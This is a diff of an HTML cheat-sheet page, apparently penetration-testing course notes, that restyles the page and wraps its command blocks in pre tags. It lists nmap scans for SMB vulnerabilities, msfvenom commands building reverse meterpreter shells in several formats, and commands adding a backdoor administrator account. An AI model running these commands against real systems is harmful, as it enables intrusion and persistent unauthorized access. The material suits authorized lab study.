@@ -6,13 +6,22 @@
         *{font-family:'Roboto',sans-serif;}
         a{
             text-decoration:none;
+            display:block;
+            color:#88c7bc;
         }
         auto-margin{
             margin:0 auto;
         }
+        h2{
+            color:#a253a1;
+        }
+        pre{
+            background-color:#d0b9e4 !important;
+        }
     </style>
 </head>
-<body class="lg-col-8 sm-col-12 auto-margin" style="background-image:url('x1080-cwy.jpg');">
+<body class="lg-col-8 sm-col-12 auto-margin" style="background:#b583b8;opacity:0.6;">
+    <div class>
     <a href="https://forums.offensive-security.com/forumdisplay.php?109-PWK-Updates-and-Errata">course updates</a>
     <a href="https://doc.lagout.org/security/">security reading</a>
     <a ref="https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/">linux privilege escalation</a>
@@ -47,34 +56,42 @@
     <a href="https://countuponsecurity.files.wordpress.com/2016/09/jtr-cheat-sheet.pdf">jtr cheat sheet</a>
     <a href="https://securitypentester.ninja/mysql-udf-injection/">mysql udf injection</a>
     <h2>My kick off scans:</h2>
-    <code>
-        nmap -oA FULL-TCP-ALL -p 0-65535 -n -A -sT -T4 -iL targets.txt
-        nmap -sU -p 0-65535 -T4 -A -n -iL targets.txt -oA UDP-FULL-A
-        nmap -F -A -n -iL targets.txt -oA TCP-FAST-A -T3
-        nmap -sU -F -oA UDP-FAST-A -A -iL targets.txt
-        nmap -p 80,443,8080,8888,8443,22,21,23,139,445 -A -oA POPULAR-WEB -iL targets.txt
-        nmap -sU --script snmp-brute
-        sudo nmap -sU -sS --script smb-enum-domains.nse,smb-enum-users.nse,smb-enum-processes.nse,smb-enum-sessions.nse,smb-enum-shares.nse,smb-ls,smb-os-discovery,smb-vuln-conficker.nse,smb-vuln-cve-2017-7494,smb-vuln-cve2009-3103.nse,smb-vuln-ms06-025.nse,smb-vuln-ms07-029.nse,smb-vuln-ms08-067.nse,smb-vuln-ms10-061,smb-vuln-ms17-010, -p U:137,T:139,T:445 -n -iL targets.txt -oA SMB-VULNS
-    </code>
-    <code>
-    nmap --script dns-zone-transfer.nse -oA DNS-ZONE-TRANSFER -iL targets.txt
-    nmap -p 111 --script=nfs-ls
-    </code>
+    <pre>
+        <code>
+            nmap -oA FULL-TCP-ALL -p 0-65535 -n -A -sT -T4 -iL targets.txt
+            nmap -sU -p 0-65535 -T4 -A -n -iL targets.txt -oA UDP-FULL-A
+            nmap -F -A -n -iL targets.txt -oA TCP-FAST-A -T3
+            nmap -sU -F -oA UDP-FAST-A -A -iL targets.txt
+            nmap -p 80,443,8080,8888,8443,22,21,23,139,445 -A -oA POPULAR-WEB -iL targets.txt
+            nmap -sU --script snmp-brute
+            sudo nmap -sU -sS --script smb-enum-domains.nse,smb-enum-users.nse,smb-enum-processes.nse,smb-enum-sessions.nse,smb-enum-shares.nse,smb-ls,smb-os-discovery,smb-vuln-conficker.nse,smb-vuln-cve-2017-7494,smb-vuln-cve2009-3103.nse,smb-vuln-ms06-025.nse,smb-vuln-ms07-029.nse,smb-vuln-ms08-067.nse,smb-vuln-ms10-061,smb-vuln-ms17-010, -p U:137,T:139,T:445 -n -iL targets.txt -oA SMB-VULNS
+        </code>
+    </pre>
+    <pre>
+        <code>
+        nmap --script dns-zone-transfer.nse -oA DNS-ZONE-TRANSFER -iL targets.txt
+        nmap -p 111 --script=nfs-ls
+        </code>
+    </pre>
     <h2>Random useful commands:</h2>
-    <code>
-        msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f elf > shell.elf
-        msfvenom -p windows/meterpreter/reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f exe > shell.exe
-        msfvenom -p php/meterpreter_reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f raw > shell.php
-        cat shell.php | pbcopy && echo '<?php ' | tr -d '\n' > shell.php && pbpaste >> shell.php
-        msfvenom -p windows/meterpreter/reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f asp > shell.asp
-        msfvenom -p java/jsp_shell_reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f raw > shell.jsp
-        msfvenom -p java/jsp_shell_reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f war > shell.war
-    </code>
-    <code>
-        net user /add lemons Lemons123
-        net localgroup administrators lemons /add
-        net user /delete lemons 
-    </code>
+    <pre>
+        <code>
+            msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f elf > shell.elf
+            msfvenom -p windows/meterpreter/reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f exe > shell.exe
+            msfvenom -p php/meterpreter_reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f raw > shell.php
+            cat shell.php | pbcopy && echo '<?php ' | tr -d '\n' > shell.php && pbpaste >> shell.php
+            msfvenom -p windows/meterpreter/reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f asp > shell.asp
+            msfvenom -p java/jsp_shell_reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f raw > shell.jsp
+            msfvenom -p java/jsp_shell_reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f war > shell.war
+        </code>
+    </pre>
+    <pre>
+        <code>
+            net user /add lemons Lemons123
+            net localgroup administrators lemons /add
+            net user /delete lemons 
+        </code>
+    </pre>
     <code>
         adduser lemons
         passwd Lemons1
